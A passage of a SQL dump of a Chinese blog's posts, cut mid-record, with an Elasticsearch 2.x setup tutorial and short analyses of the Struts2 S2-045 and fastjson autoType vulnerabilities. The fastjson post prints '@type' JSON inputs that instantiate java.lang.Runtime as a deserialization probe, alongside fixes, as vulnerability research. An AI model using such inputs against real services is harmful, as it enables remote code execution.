{\r\n                \"type\": \"string\", \r\n                \"index\": \"not_analyzed\"\r\n            }, \r\n            \"encoding\": {\r\n                \"type\": \"string\", \r\n                \"index\": \"not_analyzed\"\r\n            }, \r\n            \"file_type\": {\r\n                \"type\": \"string\", \r\n                \"index\": \"not_analyzed\"\r\n            }, \r\n            \"ctime\": {\r\n                \"type\": \"date\", \r\n                \"format\": \"yyyy-MM-dd HH:mm:ss\", \r\n                \"index\": \"not_analyzed\"\r\n            }, \r\n            \"mtime\": {\r\n                \"type\": \"date\", \r\n                \"format\": \"yyyy-MM-dd HH:mm:ss\", \r\n                \"index\": \"not_analyzed\"\r\n            }, \r\n            \"md5\": {\r\n                \"type\": \"string\", \r\n                \"index\": \"not_analyzed\"\r\n            }\r\n        }\r\n    }\r\n}\'</pre>\r\n<br />', null, '2016-12-28 19:15:05', '1', '712', 'Elasticsearch', '0', '2016-12-28 19:15:05');
INSERT INTO `sys_posts` VALUES ('1853', '1', '32', 'Elasticsearch 2.X', '园长', '<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	elasticsearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。使用elasticsearch可以快速的构建一个全文检索集群帮助你实时搜索。\n</p>\n<h2 id=\"toc_1\" style=\"font-size:24px;font-family:Helvetica, arial, sans-serif;background-color:#FFFFFF;\">\n	一、安装环境\n</h2>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>JDK环境安装</strong> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	Elasticsearch 默认需要安装jdk1.7+版本,首先需要下载 <a href=\"http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html\">jdk7</a> 选择与当前操作系统相适应的JDK版本下载Java SE Development Kit(JDK).\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	Linux:\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	选择Accept License Agreement,然后登陆Oracle账号就可以下载目前JDK7最新版的jdk-7u80-linux-x64.rpm&nbsp;安装:\n</p>\n<pre class=\"brush: bash; gutter: true\">rpm -ivh jdk-7u80-linux-x64.rpm</pre>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<img src=\"http://javaweb.org/wp-content/uploads/2015/09/0.png\" alt=\"\" /> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	环境变量:\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">vim ~/.bash_profile</span> 在文件末尾添加\n</p>\n<pre class=\"brush: bash; gutter: true\">export JAVA_HOME=/usr/java/jdk1.7.0_80\nexport CLASS_PATH=./:$JAVA_HOME/lib\nexport PATH=$PATH:$JAVA_HOME/bin</pre>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	Windows:\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	根据操作操作系统位数选择对应的版本,这里下载jdk-7u80-windows-x64.exe进行安装.\n</p>\n<img src=\"http://p2j.cn/wp-content/uploads/2015/09/01.png\" alt=\"\" /> \n<p>\n	<br />\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	安装好JDK后需要再配置环境变量,右键我的电脑-&gt;属性-&gt;高级-&gt;环境变量\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>新建变量:</strong> \n</p>\n<pre class=\"brush: bash; gutter: true\">1. JAVA_HOME指向JDK安装路径 C:\\Program Files\\Java\\jdk1.7.0_80\n2. CLASS_PATH指向%JAVA_HOME%\\lib\n3. 编辑原有的PATH,在末尾加上;%JAVA_HOME%\\bin</pre>\n<img src=\"http://javaweb.org/wp-content/uploads/2015/09/02.png\" alt=\"\" /> \n<p>\n	<br />\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>Elasticsearch 安装</strong> \n</p>\n<pre class=\"brush: bash; gutter: true\">wget -c https://download.elasticsearch.org/elasticsearch/release/org/elasticsearch/distribution/zip/elasticsearch/2.0.0/elasticsearch-2.0.0.zip\nunzip elasticsearch-2.0.0.zip</pre>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>单机配置:</strong> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	启动:\n</p>\n<pre class=\"brush: bash; gutter: true\">./bin/elasticsearch（windows下双击elasticsearch.bat）</pre>\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">后台方式启动:</span> \n<pre class=\"brush: bash; gutter: true\">./bin/elasticsearch -d</pre>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	启动成功后会监听:9200(web api端)、9300(socket api)、54328(<a href=\"https://www.elastic.co/guide/en/elasticsearch/reference/current/modules-discovery-zen.html\">zen discovery</a> udp广播).\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	建议修改掉elasticsearch默认端口9200和9300,这里修改为6200和6300这两个端口都不在nmap的常用1000个端口列表内.\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<br />\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>elasticsearch 锁定内存配置</strong> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	如果要修改ES锁定固定的内存大小需要在环境变量里设置，新建个ES<em>HEAP</em>SIZE。可以理解成指定一块固定的内存大小给elasticsearch使用。但是这个内存大小不要大于32G。\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	windows 新建环境变量:\n</p>\n<pre class=\"brush: bash; gutter: true\">ES_HEAP_SIZE=32G</pre>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	linux:\n</p>\n<pre class=\"brush: bash; gutter: true\">export ES_HEAP_SIZE=32G</pre>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>Windows 服务elasticsearch安装</strong> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	需要注意的是一定记得用全路径，如:\n</p>\n<pre class=\"brush: bash; gutter: true\">d:/elasticsearch-x.x.x/bin/elasticsearch.bat install data-01</pre>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	以前在本地测试多开ES的时候发现无法锁定内存，这样安装服务后可以避免无法读取ES_<em>HEAP_</em>SIZE问题。\n</p>\n<p>\n	<br />\n</p>\n<h2 id=\"toc_2\" style=\"font-size:24px;font-family:Helvetica, arial, sans-serif;background-color:#FFFFFF;\">\n	二：中文分词\n</h2>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	在默认情况下elasticsearch是不支持中文分词的，所以需要自行安装分词器以便于检索中文字符。这里采用elasticsearch-analysis-ik或者mmseg用于中文分词索引。\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	在elasticsearch安装目录新建文件夹:plugins\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>1、下载并安装Maven</strong> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	Maven是基于项目对象模型(POM)，可以通过一小段描述信息来管理项目的构建，报告和文档的软件项目管理工具。Maven 除了以程序构建能力为特色之外，还提供高级项目管理工具。(Maven最新版3.3.9需要JDK7+版本支持)。\n</p>\n<pre class=\"brush: bash; gutter: true\">wget -c http://apache.fayea.com/maven/maven-3/3.3.9/binaries/apache-maven-3.3.9-bin.zip</pre>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	Linux:\n</p>\n<ol style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<li>\n		<p>\n			配置环境变量:\n		</p>\n		<p>\n			vim ~/.bash_profile\n		</p>\n	</li>\n	<li>\n		<p>\n			末尾添加:\n		</p>\n	</li>\n</ol>\n<pre class=\"brush: bash; gutter: true\">export M2_HOME=/data/apache-maven-3.3.9\nPATH=$PATH:$JAVA_HOME/bin:$M2_HOME/bin</pre>\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">Windows:</span> \n<pre class=\"brush: bash; gutter: true\">1. 新建环境变量M2_HOME指向JDK安装路径 C:\\apache-maven-3.3.9\\\n2. 编辑原有的PATH,在末尾加上;%M2_HOME%\\bin</pre>\n<strong>2、安装elasticsearch-analysis-ik插件</strong> \n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	Github: <a href=\"https://github.com/medcl/elasticsearch-analysis-ik\">elasticsearch-analysis-ik</a> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	下载 elasticsearch-analysis-ik\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	解压elasticsearch-analysis-ik-master.zip\n</p>\n<ol style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<li>\n		<p>\n			执行:mvn package&nbsp;(新版的ik在linux下可能会因为编码问题构建失败,用windows试试)\n		</p>\n	</li>\n	<li>\n		<p>\n			解压 target/releases/elasticsearch-analysis-ik-{version}.zip 并复制解压后的文件到elasticsearch安装文件夹,如:/data/elasticsearch-2.0.0/plugins/ik\n		</p>\n	</li>\n	<li>\n		<p>\n			复制elasticsearch-analysis-ik-master/config目录下的ik文件夹到 elasticsearch 的config文件夹,如:/data/elasticsearch-2.0.0/config/ik\n		</p>\n	</li>\n</ol>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>3、安装elasticsearch-analysis-mmseg</strong> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	Github: <a href=\"https://github.com/medcl/elasticsearch-analysis-mmseg\">elasticsearch-analysis-mmseg</a> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	下载 elasticsearch-analysis-mmseg\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	解压elasticsearch-analysis-mmseg-master.zip\n</p>\n<ol style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<li>\n		<p>\n			执行:mvn package\n		</p>\n	</li>\n	<li>\n		<p>\n			在elasticsearch安装目录下的plugins目录新建文件夹mmseg\n		</p>\n	</li>\n	<li>\n		<p>\n			构建完成后复制target目录下生成的elasticsearch-analysis-mmseg-1.5.0.jar、plugin-descriptor.properties到elasticsearch安装目录的plugins/mmseg文件夹。复制elasticsearch-analysis-mmseg-master/config/mmseg文件夹到elasticsearch安装目录的config文件夹。\n		</p>\n	</li>\n</ol>\n<h2 id=\"toc_3\" style=\"font-size:24px;font-family:Helvetica, arial, sans-serif;background-color:#FFFFFF;\">\n	三：Nginx HttpBasic认证\n</h2>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>Elasticsearch</strong>启动后默认监听9200(netty-web端口)、9300(socket transport)。9200端口提供了RESTFUL查询支持比较方便。这里配置nginx代理为es的web接口添加负载和基础认证。\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>1、安装nginx</strong> \n</p>\n<pre class=\"brush: bash; gutter: true\">yum -y install nginx \nservice nginx start\nchkconfig nginx on</pre>\n<strong>2、访问配置</strong> \n<pre class=\"brush: bash; gutter: true\">vim /etc/nginx/conf.d/es.conf</pre>\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">添加:</span> \n<pre class=\"brush: bash; gutter: true\">server {\n    server_name es.xxx.com;\n    access_log  logs/es.access.log  main;\n    listen 80;\n    location / {\n        proxy_pass http://localhost:6200;\n        auth_basic \"secret\";\n        auth_basic_user_file /etc/nginx/conf.d/es.db;\n    }\n\n    location /status {\n        stub_status on;\n        auth_basic \"NginxStatus\";\n    }\n}</pre>\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">下载htpasswd脚本，根据提示生成db文件:</span> \n<pre class=\"brush: bash; gutter: true\">wget http://p2j.cn/tools/htpasswd.sh</pre>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	如此配置只能保证6200端口需授权访问，但是6300依旧可能直接访问。加上iptables或者安装<a href=\"http://www.elastic.co/products/shield\">elasticsearch Shield</a> 插件。如果确认只对内网开放可以配置(network.bind_host为内网IP)。\n</p>\n<h2 id=\"toc_4\" style=\"font-size:24px;font-family:Helvetica, arial, sans-serif;background-color:#FFFFFF;\">\n	四：集群\n</h2>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>Elasticsearch</strong>会根据集群名称自动加入新的集群，所以只要保证集群名一样就行了。\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>1、集群配置</strong> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	核心配置文件:&nbsp;config/elasticsearch.yml\n</p>\n<pre class=\"brush: actionscript3; gutter: true\">node.name: \"es-01\"\ncluster.name: \"web-search\"\nnode.master: true 是否设置为主节点，设置es-01为主节点。不设置也会自动选举。</pre>\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">elasticsearch 2.0版本开始</span>network.host<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">默认变成了127.0.0.1和::1,也就是说需要配置</span>network.host<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">才允许对外访问.如果要做内网集群这里需要写一个内外网IP地址.</span> \n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<img src=\"http://javaweb.org/wp-content/uploads/2015/09/07.png\" alt=\"\" /> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\"><br />\n</span> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">可在elasticsearch.yml末尾加上一些优化配置:</span> \n</p>\n<pre class=\"brush: xml; gutter: true\">bootstrap.mlockall: true\nindex.cache.field.type: soft\nindex.cache.field.max_size: 50000\nindex.cache.field.expire: 10m</pre>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	复制已配置好的elasticsearch-2.0.0目录为elasticsearch-2.0.0-2(或者复制已配置好的elasticsearch-2.0.0目录到内网其他服务器)\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	修改:&nbsp;elasticsearch-2.0.0-2/config/elasticsearch.yml\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	修改节点配置：\n</p>\n<pre class=\"brush: xml; gutter: true\">node.name: \"es-02\"\ncluster.name: \"es-doc\"\n注释掉：#node.master: true</pre>\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">elasticsearch 1.x版本开始用多播来发现子网内的节点服务器,但是在elasticsearch 2.0版本开始已</span><a href=\"https://www.elastic.co/blog/elasticsearch-unplugged\">移除了集群多播自动发现</a><span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">(discovery-multicast).不过可以在elasticsearch.yml手动配置节点的IP地址.可以加端口,但端口是transport端口6300.</span> \n<pre class=\"brush: xml; gutter: true\">discovery.zen.ping.unicast.hosts: [\"192.168.12.1\", \"192.168.12.2\"]</pre>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	当然2.0.0版本的用户也可以以插件的形式去<a href=\"https://www.elastic.co/guide/en/elasticsearch/plugins/2.0/discovery-multicast.html\">安装discovery-multicast</a> \n</p>\n<pre class=\"brush: bash; gutter: true\">sudo bin/plugin install discovery-multicast</pre>\n<p>\n	<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">2.0.0版本以上的用户可能会遇到如下错误:</span> \n</p>\n<pre class=\"brush: actionscript3; gutter: true\">ERROR: Plugin [${elasticsearch.plugin.name}] is incompatible with Elasticsearch [2.1.0]. Was designed for version [2.0.0]</pre>\n<h2 id=\"toc_5\" style=\"font-size:24px;font-family:Helvetica, arial, sans-serif;background-color:#FFFFFF;\">\n	五：测试\n</h2>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	启动两个elasticsearch，如果配置了基础认证访问elasticsearch.yml的时候记得带上密码。\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>1、查看集群状态</strong> \n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	http://账号:密码@localhost:6200/_cluster/health?pretty\n</p>\n<img src=\"http://javaweb.org/wp-content/uploads/2015/09/09.png\" alt=\"\" /> \n<p>\n	<br />\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">可以看到：</span> \n</p>\n<pre class=\"brush: xml; gutter: true\">{\n        cluster_name: \"web-search\", 集群名字是web-search\n        status: \"green\",    集群状态良好green\n        timed_out: false,\n        number_of_nodes: 2, 节点数2个\n        number_of_data_nodes: 2,    存储节点2个\n        active_primary_shards: 5,   主分片数5个\n        active_shards: 10,  分片总数10个\n        relocating_shards: 0,\n        initializing_shards: 0,\n        unassigned_shards: 0,   未分配的分片\n        delayed_unassigned_shards: 0,\n        number_of_pending_tasks: 0,\n        number_of_in_flight_fetch: 0,\n        task_max_waiting_in_queue_millis: 0,\n        active_shards_percent_as_number: 100\n}</pre>\n<strong>2、创建索引</strong> \n<pre class=\"brush: bash; gutter: true\">curl -XPUT http://localhost:6200/test</pre>\n<strong>3、创建映射</strong> \n<pre class=\"brush: bash; gutter: true\">curl -XPOST http://localhost:6200/test/fulltext/_mapping -d\'\n{\n    \"fulltext\": {\n        \"_all\": {\n            \"analyzer\": \"ik_max_word\",\n            \"search_analyzer\": \"ik_max_word\",\n            \"term_vector\": \"no\",\n            \"store\": \"false\"\n        },\n        \"properties\": {\n            \"content\": {\n                \"type\": \"string\",\n                \"store\": \"no\",\n                \"term_vector\": \"with_positions_offsets\",\n                \"analyzer\": \"ik_max_word\",\n                \"search_analyzer\": \"ik_max_word\",\n                \"include_in_all\": \"true\",\n                \"boost\": 8\n            }\n        }\n    }\n}\'</pre>\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">4、添加索引</span> \n<pre class=\"brush: bash; gutter: true\">curl -XPOST http://localhost:6200/test/fulltext/1 -d\'\n{\"content\":\"美国留给伊拉克的是个烂摊子吗\"}\'</pre>\n<pre class=\"brush: bash; gutter: true\">curl -XPOST http://localhost:6200/test/fulltext/2 -d\'\n{\"content\":\"公安部：各地校车将享最高路权\"}\'</pre>\n<pre class=\"brush: bash; gutter: true\">curl -XPOST http://localhost:6200/test/fulltext/3 -d\'\n{\"content\":\"中韩渔警冲突调查：韩警平均每天扣1艘中国渔船\"}\'</pre>\n<pre class=\"brush: bash; gutter: true\">curl -XPOST http:// localhost:6200/test/fulltext/4 -d\'\n{\"content\":\"中国驻洛杉矶领事馆遭亚裔男子枪击 嫌犯已自首\"}</pre>\n<span style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">5、搜索和搜索结果高亮</span> \n<pre class=\"brush: bash; gutter: true\">curl -XPOST http://localhost:6200/test/fulltext/_search  -d\'\n{\n    \"query\" : { \"term\" : { \"content\" : \"中国\" }},\n    \"highlight\" : {\n        \"pre_tags\" : [\"\", \"\"],\n        \"post_tags\" : [\"\", \"\"],\n        \"fields\" : {\n            \"content\" : {}\n        }\n    }\n}\n\'</pre>\n<h2 id=\"toc_6\" style=\"font-size:24px;font-family:Helvetica, arial, sans-serif;background-color:#FFFFFF;\">\n	六：Java客户端\n</h2>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>1、批量导入</strong> 添加elasticsearch-2.0.0.jar和lucene-core-5.2.1.jar\n</p>\n<p style=\"font-family:Helvetica, arial, sans-serif;font-size:14px;background-color:#FFFFFF;\">\n	<strong>测试HtmlDoc.java：</strong> \n</p>\n<p>\n	<br />\n</p>\n<pre class=\"brush: java; gutter: true\">import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.util.HashSet;\nimport java.util.LinkedHashMap;\nimport java.util.Map;\nimport java.util.Set;\nimport net.sf.json.JSONObject;\nimport org.apache.commons.io.IOUtils;\nimport org.elasticsearch.action.bulk.BulkRequestBuilder;\nimport org.elasticsearch.action.bulk.BulkResponse;\nimport org.elasticsearch.client.Client;\nimport org.elasticsearch.client.transport.TransportClient;\nimport org.elasticsearch.common.settings.ImmutableSettings;\nimport org.elasticsearch.common.settings.Settings;\nimport org.elasticsearch.common.transport.InetSocketTransportAddress;\nimport org.javaweb.utils.HttpRequestUtils;\n\n\npublic class HtmlDoc {\n  \n  public static void addIndex(Set&lt;map&lt;string,string&gt;&gt; ls){\n    try {\n      Settings settings = ImmutableSettings.settingsBuilder().put(\"cluster.name\", \"es-doc\").put(\"client.transport.sniff\", true).build();\n      Client client = new TransportClient(settings).addTransportAddress(new InetSocketTransportAddress(\"localhost\",6300));\n      BulkRequestBuilder bulkRequest = client.prepareBulk();\n      \n      for(Map&lt;string,string&gt; doc:ls){\n        bulkRequest.add(client.prepareIndex(\"domain\", \"documents\").setSource(JSONObject.fromObject(doc).toString()));\n      }\n      \n      BulkResponse bulkResponse = bulkRequest.execute().actionGet();\n      if (bulkResponse.hasFailures()) {\n        System.out.println(\"导入失败...\");\n      }else{\n        System.out.println(\"导入成功...\");\n      }\n      client.close();\n    } catch (Exception e) {\n      System.out.println(e.toString()+\",导入异常.\");\n    }\n  }\n}\n</pre>', null, '2016-12-28 19:34:33', '1', '882', 'Elasticsearch', '2', '2016-12-28 19:34:33'), ('1854', '1', '31', 'Struts2 S2-045 远程OGNL表达式执行漏洞', '园长', '<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n<div>\r\n	Struts2在解析请求的时候会主动把MULTIPART请求给解析成参数，这里的MULTIPART请求被解析了两遍。一遍是框架解析的，另一遍是那个自带的插件解析的。两个地方判断是否是文件上传请求的时候的代码不一致，导致了error。\r\n</div>\r\n<div>\r\n	<br />\r\n</div>\r\n<p>\r\n	Struts2的验证是否是MULTIPART的方式：&nbsp;\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20170306/20170306122327_265.jpg\" alt=\"\" />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\nFileUploadBase验证方式:\r\n</p>\r\n<p>\r\n	<img src=\"http://p2j.cn/uploads/image/20170306/20170306122358_187.jpg\" alt=\"\" />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<!--?xml version=\"1.0\" encoding=\"UTF-8\"?-->\r\n	<div>\r\n		简单的说就是Struts2的开发者判断是否是MULTIPART方式是如果字符串里面包含了multipart/form-data就认为是，而后面的FileUploadBase判断是字符串里面必须是以multipart/form-data开头的请求才认为是文件上传。如果把FileUploadBase的判断MULTIPART的时候方法换成Dispatcher类的content_type.contains(\"multipart/form-data\")就不会触发这个error了。而这个error中的异常信息最终会被拿去当ognl表达式执行。这种神逻辑其实算起来跟上次的springboot的表达式注入漏洞差不多，因为异常导致的表达式注入。\r\n	</div>\r\n	<div>\r\n		<br />\r\n	</div>\r\n	<p>\r\n		官方的修复方式代码替换掉了LocalizedTextUtil.findText:&nbsp;\r\n	</p>\r\n	<p>\r\n		<img src=\"http://p2j.cn/uploads/image/20170306/20170306122419_570.jpg\" alt=\"\" />\r\n	</p>\r\n	<p>\r\n		<br />\r\n	</p>\r\n	<p>\r\n		<br />\r\n	</p>\r\n</p>', null, '2017-03-06 12:24:30', '1', '755', '', '0', '2017-03-06 12:24:30'), ('1855', '1', '13', 'fastjson 远程代码执行漏洞', '园长', '<p>\r\n	<span style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;background-color:#ffffff;\"=\"\">最近发现fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞，为了保证系统安全，请升级到1.2.28/1.2.29或者更新版本。</span> \r\n</p>\r\n<p style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;background-color:#ffffff;\"=\"\"> <span style=\"font-family:;\">官方公告：</span><a class=\"ke-insertfile\" href=\"https://github.com/alibaba/fastjson/wiki/security_update_20170315\" target=\"_blank\">https://github.com/alibaba/fastjson/wiki/security_update_20170315</a> \r\n	</p>\r\n	<p>\r\n		这个可能存在的远程代码执行漏洞产生的原因是fastjson反序列化json字符串为java对象的时候<span style=\"color:#05264C;font-family:-apple-system, system-ui, \" font-size:18px;font-weight:600;background-color:#eaf5ff;\"=\"\">autoType没有正确的检测处理。</span> \r\n	</p>\r\n	<p>\r\n		参照：<a class=\"ke-insertfile\" href=\"https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5\" target=\"_blank\">https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5</a> \r\n	</p>\r\n	<p>\r\n		触发漏洞需要构造一个特殊的json对象，这种应用场景多出现在C/S接口交互。公告中说道：\"<span style=\"color:#24292E;font-family:-apple-system, system-ui, \" font-size:16px;background-color:#ffffff;\"=\"\">安全升级包禁用了部分autotype的功能，也就是\"@type\"这种指定类型的功能会被限制在一定范围内使用。</span>\"\r\n	</p>\r\n	<p>\r\n		当反序列化一个特殊的json字符串为java对象时可以实例化”任意“(有几个类如Thread在黑名单除外)的java对象并调用部分的java方法。\r\n	</p>\r\n	<p>\r\n		比如序列号如下json字符串(<span>键</span>包含了\"@type\" JsonTypeInfo类中的注解)时,fastjson会创建一个java对象实例:\r\n	</p>\r\n<pre class=\"brush: java; gutter: true\">String json = \"{\\\"@type\\\":\\\"java.lang.Runtime\\\"}\";\r\nObject obj = JSON.parseObject(json, Object.class);\r\nSystem.out.println(obj);</pre>\r\n	<p>\r\n		执行上面的代码会发现输出了：java.lang.Runtime@194e4c9a，不过并不是就可以执行任意的代码了，因为得找一个触发点给方法传参。查了下fastjson的代码，发现可以直接在后面@type后面写方法名称和参数\r\n	</p>\r\n<pre class=\"brush: java; gutter: true\">String json = \"{\\\"@type\\\":\\\"org.javaweb.test.controller.Test\\\",\\\"cmd\\\":{\\\"@type\\\":\\\"java.lang.Runtime\\\"}}\";</pre>\r\n比如Test类有个setCmd方法可以传入自定义参数。但是JavaBeanInfo在反序列化操作的时候限定了很多条件，比如不能是静态方法、而且必须是setXXX方法，不过static类的成员变量可以直接修改值。\r\n	<p>\r\n		<img src=\"http://p2j.cn/uploads/image/20170318/20170318162547_353.png\" alt=\"\" width=\"800\" height=\"492\" title=\"\" align=\"\" /> \r\n	</p>\r\n	<p>\r\n		<br />\r\n	</p>\r\n	<p>\r\n		目前看起来虽然可以通过@type创建一些特殊的对象并调用一些方法但是想调用到任意的方法还没能找到方法，先记录着。。\r\n	</p>\r\n	<p>\r\n		修复方法：\r\n	</p>\r\n	<p>\r\n		1、升级fastjson版本(注意可能有兼容问题，参见：<a class=\"ke-insertfile\" href=\"https://github.com/alibaba/fastjson/wiki/incompatible_change_list\" target=\"_blank\">https://github.com/alibaba/fastjson/wiki/incompatible_change_list</a>)\r\n	</p>\r\n	<p>\r\n		2、全局过滤\"@type\"关键字\r\n	</p>\r\n	<p>\r\n		<br />\r\n	</p>', null, '2017-03-18 16:40:41', '1', '1306', '', '0', '2017-03-18 16:40:41'), ('1856', '1', '3', 'IDEA 由数据库表生成带注释的java实体类代码', '园长', '<p>\r\n	